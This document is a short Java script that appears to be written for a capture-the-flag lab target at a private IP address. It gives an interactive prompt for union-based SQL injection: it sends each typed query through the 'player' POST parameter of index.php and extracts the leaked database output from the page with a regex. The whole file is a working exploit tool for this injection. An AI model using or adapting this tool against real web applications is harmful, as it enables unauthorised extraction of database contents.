//usr/bin/env java $0 $@; exit $?

package scripts;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;

import java.net.HttpURLConnection;
import java.net.URL;

import java.util.Scanner;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class UnionSQLi {

  private static final String POST_URL = "http://10.10.11.128/index.php";
  private static final String POST_DATA = "player=' union %s -- -";
  private static final Pattern PATTERN = Pattern.compile("Sorry, ([\\s\\S]*?) you are not eligible due to already qualifying.");

  public static void main(String[] args) {
    try (Scanner in = new Scanner(System.in)) {
      while (true) {
        System.out.print("SQLi> ");
        String sqli = in.nextLine();

        if (sqli.equals("exit")) {
          break;
        } else if (sqli.isEmpty()) {
          continue;
        }

        String response = sendPOST(sqli);

        if (response.startsWith("Sorry")) {
          System.out.println(filterResult(response));
        } else {
          System.out.println("ERROR");
        }
      }
    } catch (IOException e) {
      System.out.println("ERROR");
    }
  }

  private static String sendPOST(String sqli) throws IOException {
    URL url = new URL(POST_URL);
    HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
    httpURLConnection.setRequestMethod("POST");
    httpURLConnection.setDoOutput(true);

    OutputStream outputStream = httpURLConnection.getOutputStream();
    outputStream.write(String.format(POST_DATA, sqli).getBytes());
    outputStream.flush();
    outputStream.close();

    if (httpURLConnection.getResponseCode() == HttpURLConnection.HTTP_OK) {
      try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()))) {
        return bufferedReader.lines().map(line -> line + "\n").reduce(String::concat).orElse("");
      } catch (IOException e) {
        System.out.println("ERROR");
      }
    }

    return "";
  }

  private static String filterResult(String response) {
    Matcher matcher = PATTERN.matcher(response);
    matcher.find();
    return matcher.group(1);
  }
}
